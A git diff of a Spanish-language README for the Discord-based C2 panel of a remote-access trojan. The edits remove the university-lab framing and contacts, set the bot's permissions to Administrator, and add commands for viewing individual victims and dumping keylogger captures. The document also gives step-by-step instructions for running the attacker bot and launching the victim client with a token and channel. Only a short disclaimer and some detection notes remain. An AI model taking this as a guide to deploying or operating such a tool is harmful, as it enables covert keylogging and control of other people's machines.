@@ -2,7 +2,7 @@
 
 ## Descripción
 
-Este es el componente del centro de comando (C2) del laboratorio educativo RAT. Proporciona a los estudiantes una interfaz de "Red Team" para controlar el payload de la víctima y analizar sistemas comprometidos.
+Este es el componente del centro de comando (C2) del RAT. Proporciona una interfaz de "Red Team" para controlar el payload de la víctima y analizar sistemas comprometidos.
 
 ## Advertencia Legal
 
@@ -16,13 +16,13 @@ USO PROHIBIDO:
 ✗ Distribución de malware o código malicioso
 
 USO PERMITIDO:
-✓ Laboratorios académicos de técnicas de ataque
+✓ Entornos de prueba aislados (VMs sin internet)
 ✓ Simulación de respuesta a incidentes (DFIR)
 ✓ Competencias de seguridad (CTF)
 ✓ Entrenamiento defensivo en detección
 ✓ Investigación de técnicas de ciberataque
 
-ESENCIAL PARA:
+ESPECIALMENTE RELEVANTE PARA:
 • Ingenieros de seguridad ofensiva
 • Arquitectos de defensa cibernética
 • Analistas de detección y respuesta
@@ -37,36 +37,23 @@ ESENCIAL PARA:
 - **Comandos del panel** para control
 - **Logging de actividades** para análisis forense
 
-### Módulo de Comandos (`commands.py`)
-- **Comandos del panel** del atacante
-- **Gestión de sesiones** activas
-- **Acciones de broadcast** a todas las víctimas
-- **Herramientas de limpieza** y mantenimiento
-
-### Configuración (`config.py`)
-- **Variables de entorno** del bot
-- **Configuración del servidor**
-- **Configuración de logging**
-- **Validación de configuración**
+Todo está integrado en `bot.py` (configuración, comandos y logging).
 
 ## Requisitos del Sistema
 
-### Dependencias del Sistema (Atacante)
+### Dependencias
 ```bash
 pip install -r attacker/requirements.txt
 
 Dependencias principales:
-- discord.py==2.3.2: Cliente Discord para C2
-- python-dotenv==1.0.0: Variables de entorno
-- pytest==7.4.0: Pruebas unitarias
-- pytest-asyncio==0.21.0: Pruebas asíncronas
+- discord.py: Cliente Discord para C2
+- python-dotenv: Variables de entorno
 ```
 
 ### Requisitos del Sistema
 
 - **Sistema Operativo:** Linux, Windows o macOS
-- **Python:** 3.8 o superior
-- **Memoria:** 2GB RAM (mínimo)
+- **Python:** 3.10 o superior
 - **Red:** Conectividad a internet (para Discord)
 
 ## Instalación y Configuración
@@ -74,9 +61,9 @@ Dependencias principales:
 ### 1. Prerrequisitos
 ```bash
 # Crear entorno virtual (recomendado)
-python -m venv c2-lab-env
-source c2-lab-env/bin/activate  # Linux/Mac
-c2-lab-env\Scripts\activate     # Windows
+python -m venv venv
+source venv/bin/activate  # Linux/Mac
+venv\Scripts\activate     # Windows
 
 # Instalar dependencias
 pip install -r attacker/requirements.txt
@@ -84,7 +71,7 @@ pip install -r attacker/requirements.txt
 
 ### 2. Configurar Variables de Entorno
 ```bash
-# Archivo .env en la raíz del proyecto
+# Archivo attacker/.env
 DISCORD_BOT_TOKEN="tu_token_del_bot_aqui"
 COMMAND_CHANNEL_ID="id_del_canal_de_comandos_aqui"
 ```
@@ -94,21 +81,16 @@ COMMAND_CHANNEL_ID="id_del_canal_de_comandos_aqui"
 #### Paso 1: Crear Aplicación
 1. Visitar: https://discord.com/developers/applications
 2. Hacer clic en "New Application"
-3. Dar nombre: "RAT C2 Security Lab"
-4. Hacer clic en "Bot" en Build section
+3. Hacer clic en "Bot" en Build section
 
 #### Paso 2: Configurar Bot
 1. En Bot settings:
-   - Nombre de usuario: "Security Bot"
-   - Descripción: "Laboratorio educativo C2 para fines académicos"
+   - Activar: Presence Intent, Server Members Intent, Message Content Intent
+   - Reset Token y copiar el token
 
 2. En OAuth2:
    - URL de redirección: `https://discord.com/api/oauth2_redirect`
-   - Permisos del bot:
-     - Leer mensaje
-     - Enviar mensaje
-     - Adjuntar archivos
-     - Gestionar canales
+   - Permisos del bot: Administrator
 
 #### Paso 3: Invitar Bot
 ```
@@ -121,28 +103,21 @@ export DISCORD_BOT_TOKEN="TU_TOKEN_DEL_BOT"
 export COMMAND_CHANNEL_ID="ID_DEL_CANAL"
 ```
 
-## Ejecución del Laboratorio
+## Ejecución
 
 ### Terminal 1 - Centro de Comando (Atacante)
 ```bash
-# Navegar al directorio
-mkdir -p rat-educational-lab/attacker
-cd rat-educational-lab/attacker
-
-# Instalar dependencias
+cd attacker
 pip install -r attacker/requirements.txt
-
-# Ejecutar bot C2
 python bot.py
 ```
 
 ### Terminal 2 - Víctima (Máquina Comprometida)
 ```bash
-# En la máquina víctima (ejemplo usando victim del laboratorio)
-cd rat-educational-lab/victim
+cd victim
 pip install -r victim/requirements.txt
 
-# Ejecutar RAT (ejemplo con configuración)
+# Ejecutar RAT
 python client.py --token "TU_TOKEN_DEL_BOT" --channel "ID_DEL_CANAL"
 
 # Para testing (usar solo en VMs autorizadas)
@@ -156,9 +131,13 @@ python client.py --token "TU_TOKEN_DEL_BOT" --channel "ID_DEL_CANAL" --allow-san
 | Comando | Uso | Descripción |
 |---------|-----|-------------|
 | `!sessions` | Ninguno | Lista todas las sesiones activas |
+| `!victim <id>` | `<id>` | Ver detalle de una víctima |
 | `!broadcast <mensaje>` | `<mensaje>` | Envía mensaje a todas las sesiones |
+| `!keylog_dump` | Ninguno | Solicitar volcado del keylogger |
+| `!notify on/off` | `on/off` | Activar/desactivar notificaciones |
 | `!cleanup` | Ninguno | Limpia sesiones inactivas |
-| `!info` | Ninguno | Muestra información del sistema del bot |
+| `!info` | Ninguno | Muestra información del bot |
+| `!help_c2` | Ninguno | Muestra ayuda del panel |
 
 ### Ejemplos de Uso
 
@@ -166,97 +145,23 @@ python client.py --token "TU_TOKEN_DEL_BOT" --channel "ID_DEL_CANAL" --allow-san
 # Ver sesiones activas
 !sessions
 
+# Ver detalle de una víctima
+!victim abc123
+
 # Broadcast a todas las víctimas
 !broadcast "⚠️ ALERTA: Ejercicio de seguridad activo"
 
-# Limpiar sesiones inactivas  
+# Solicitar keylog dump
+!keylog_dump
+
+# Activar notificaciones
+!notify on
+
+# Limpiar sesiones inactivas
 !cleanup
 
-# Información del sistema
+# Información del bot
 !info
-```
-
-## Configuración y Desarrollo
-
-### Configuración (`config.py`)
-
-#### DiscordConfig
-```python
-@dataclass
-class DiscordConfig:
-    bot_token: str
-    command_channel_id: int
-    
-    @classmethod
-    def from_env(cls) -> 'DiscordConfig':
-        """Crea configuración desde variables de entorno"""
-        token = os.getenv('DISCORD_BOT_TOKEN')
-        channel_id_str = os.getenv('COMMAND_CHANNEL_ID')
-        
-        if not token:
-            raise ValueError("DISCORD_BOT_TOKEN no está definida")
-        
-        if not channel_id_str:
-            raise ValueError("COMMAND_CHANNEL_ID no está definida")
-        
-        try:
-            channel_id = int(channel_id_str)
-        except ValueError:
-            raise ValueError("COMMAND_CHANNEL_ID debe ser un número entero")
-        
-        return cls(
-            bot_token=token,
-            command_channel_id=channel_id
-        )
-```
-
-#### AppConfig
-```python
-class AppConfig:
-    """Configuración principal de la aplicación"""
-    
-    def __init__(self):
-        self.discord = DiscordConfig.from_env()
-        self.server = ServerConfig()
-        self.logging = LoggingConfig()
-    
-    def validate(self):
-        """Valida la configuración"""
-        # Implementación de validación
-        return True
-```
-
-### Pruebas
-
-#### Ejemplo de Prueba Unitaria
-```python
-# tests/test_bot.py
-import pytest
-from unittest.mock import AsyncMock, MagicMock
-from attacker.bot import ControlCommands
-
-@pytest.mark.asyncio
-async def test_sessions_command():
-    """Testea el comando de sesiones"""
-    mock_bot = MagicMock()
-    mock_bot.send = AsyncMock()
-    
-    commands = ControlCommands(mock_bot)
-    await commands.sessions_command(mock_bot)
-    
-    mock_bot.send.assert_called_once_with("Sesiones activas")
-```
-
-#### Correr Pruebas
-```bash
-# Instalar dependencias de testing
-pip install pytest pytest-asyncio
-
-# Correr todas las pruebas
-pytest
-
-# Correr pruebas específicas
-pytest tests/test_bot.py
 ```
 
 ## Monitoreo y Logs
@@ -266,30 +171,20 @@ El bot registra:
 
 1. **Eventos de conexión**
    ```
-   2024-10-08 10:30:15 - INFO - Bot iniciado: Security Bot
-   2024-10-08 10:30:16 - INFO - Esperando conexiones...
+   [2026-10-13 10:30:15] ATACANTE:BOT_INICIADO
    ```
 
 2. **Sesiones de víctimas**
    ```
-   2024-10-08 11:45:22 - INFO - Nueva sesión: ABC123DEF456
-   2024-10-08 11:45:22 - INFO - Sesión iniciada desde: 192.168.1.100
+   [2026-10-13 11:45:22] ATACANTE:NUEVA_SESION abc123
    ```
 
 3. **Comandos del atacante**
    ```
-   2024-10-08 12:00:45 - INFO - Atacante: sessions - Admin: hacker
-   2024-10-08 12:01:12 - INFO - Atacante: broadcast - Admin: hacker - Mensaje: ¡Ejercicio activo!
+   [2026-10-13 12:00:45] ATACANTE:LISTAR_SESIONES 3 activas
+   [2026-10-13 12:01:12] ATACANTE:BROADCAST Mensaje de prueba
+   [2026-10-13 12:02:30] ATACANTE:KEYLOG_DUMP A 3 sesiones
    ```
-
-### File de Log
-```
-# attacker/logs/bot.log
-2024-10-08 10:30:15,123 - INFO - Bot iniciado: Security Bot
-2024-10-08 10:30:16,456 - INFO - Canal C2: #comando
-2024-10-08 11:45:22,789 - INFO - Nueva sesión: ABC123DEF456
-2024-10-08 12:00:45,123 - INFO - Atacante: sessions - Admin: hacker
-```
 
 ## Análisis y Detección Defensiva
 
@@ -419,11 +314,9 @@ sudo iptables -D INPUT -s 192.168.1.100 -j DROP
 sudo reboot
 ```
 
-## Guía de Mejora para Estudiantes
+## Mejoras Técnicas
 
-### Mejoras Técnicas
-
-#### 1. Seguridad del Bot
+### 1. Seguridad del Bot
 - **Almacenamiento seguro de tokens**
   ```python
   # En lugar de hardcode tokens, usar archivos cifrados
@@ -438,7 +331,7 @@ sudo reboot
   context = ssl.create_default_context()
   ```
 
-#### 2. Detección Avanzada
+### 2. Detección Avanzada
 - **Detección de firmas**
   ```python
   # Detectar comportamientos específicos del RAT
@@ -452,7 +345,7 @@ sudo reboot
   strings = subprocess.run(['strings', pid], capture_output=True)
   ```
 
-#### 3. Autenticación del Panel
+### 3. Autenticación del Panel
 ```python
 # Agregar autenticación de dos factores
 from cryptography.fernet import Fernet
@@ -460,104 +353,16 @@ key = Fernet.generate_key()
 cipher = Fernet(key)
 ```
 
-### Mejoras de Documentación
-
-#### 1. Guía de Referencia Rápida
-```markdown
-# Referencia Rápida del Bot C2
-
-## Comandos
-- `!sessions`: Ver víctimas activas
-- `!broadcast <msg>`: Enviar a todos
-- `!cleanup`: Limpiar sesiones
-- `!info`: Estado del sistema
-
-## Configuración
-- TOKEN: Token del bot Discord
-- CHANNEL: ID del canal de comandos
-- LOG_LEVEL: DEBUG, INFO, WARNING
-```
-
-#### 2. Documentación de API
-```python
-# api/endpoints.py
-from fastapi import FastAPI, HTTPException
-from fastapi.responses import JSONResponse
-
-app = FastAPI(title="C2 Security Lab API")
-
-@app.get("/api/sessions")
-async def get_sessions():
-    """Devuelve sesiones activas"""
-    # Implementación
-    return {"sessions": sessions}
-
-@app.post("/api/broadcast")
-async def broadcast_message(message: str):
-    """Envía broadcast a todas las sesiones"""
-    # Implementación
-    return {"status": "success", "message": message}
-```
-
-## Contacto y Soporte
-
-### Para Docentes
-
-- **Problemas técnicos:** contactar al soporte técnico del laboratorio
-- **Errores en contenido:** contactar al autor del curso
-- **Actualizaciones del laboratorio:** enviar solicitud a maintainer@university.edu
-
-### Para Estudiantes
-
-- **Problemas de ejecución:** usar `#soporte` en Discord
-- **Dudas teóricas:** preguntar en #academico
-- **Errores de configuración:** usar `#ayuda-configuracion`
-
-### Recursos de Apoyo
+## Recursos de Apoyo
 
 - [Documentación de Discord API](https://discord.com/developers/docs)
 - [Python Discord.py](https://discordpy.readthedocs.io/)
 - [Guía de Seguridad de Metasploit](https://docs.metasploit.com/)
 - [Documentación de Respuesta a Incidentes SANS](https://www.sans.edu/courses/incident-response)
 
-## Mantenimiento y Actualización
+## Guía de Contribución
 
-### Script de Actualización
-```python
-# scripts/update_lab.py
-#!/usr/bin/env python3
-"""
-Script de actualización automática para el laboratorio C2
-"""
-
-import subprocess
-import sys
-from pathlib import Path
-
-def actualizar_dependencias():
-    """Actualiza todas las dependencias"""
-    print("Actualizando dependencias...")
-    subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "-r", "attacker/requirements.txt"])
-    subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "-r", "victim/requirements.txt"])
-
-def hacer_backup():
-    """Crea backup del estado actual"""
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    backup_path = f"backup_{timestamp}"
-    
-    subprocess.run(["cp", "-r", "attacker", backup_path])
-    print(f"Backup creado en: {backup_path}")
-
-if __name__ == "__main__":
-    print("🔄 Actualizando laboratorio C2...")
-    hacer_backup()
-    actualizar_dependencias()
-    print("✅ Laboratorio actualizado!")
-```
-
-### Guía de Contribución
-
-#### Para Mejorar el Laboratorio
+### Para Mejorar el Proyecto
 
 1. **Reportar bugs**
    - Usar GitHub Issues con etiquetas: `bug`, `feature`, `documentation`
@@ -575,42 +380,20 @@ if __name__ == "__main__":
    - Agregar ejemplos de uso
    - Documentar configuración de entorno
 
-#### Estándares de Calidad
+### Estándares de Calidad
 
 - **Calidad de Código:** PEP 8, tipos anotados, docstrings
 - **Pruebas:** >80% de cobertura, pruebas unitarias
 - **Documentación:** README completo, comentarios
 - **Seguridad:** Sin tokens hardcodeados, logging seguro
 
-## Última Actualización
-
-Octubre 2026 - Versión 1.0 para Centro de Comando Educativo
-
----
-
-**Para soporte técnico:** c2-support@university.edu
-**Para preguntas académicas:** profesor@university.edu
-**Para reportar bugs:** github issues
-
-*Este laboratorio es parte del programa de Investigación de Seguridad Computacional de la Universidad.*
-
 ---
 
 **⚠️ RECORDATORIO IMPORTANTE:**
-*Este bot C2 es para fines académicos únicamente. Usar en sistemas sin autorización puede violar leyes y regulaciones. Mantener la supervisión académica y seguir todos los protocolos de seguridad requeridos.*
+*Este bot C2 debe usarse solo en sistemas con autorización explícita. Usar en sistemas sin autorización puede violar leyes y regulaciones.*
 
 ---
 
-"Herramientas de ataque entendidas, defensas construidas.“ 💻🔐"
-
----
-
-*Esta documentación está sujeta a cambios según evolucione el laboratorio.*
-
----
-
-**UTENSILIO DE CONOCIMIENTO:**
-*Entender cómo funcionan estas herramientas nos hace más fuertes defensas.*
-**APRENDER → PROTEGER → AVANZAR** 📚🛡️🚀
+**"Herramientas de ataque entendidas, defensas construidas."** 💻🔐
 
 ---
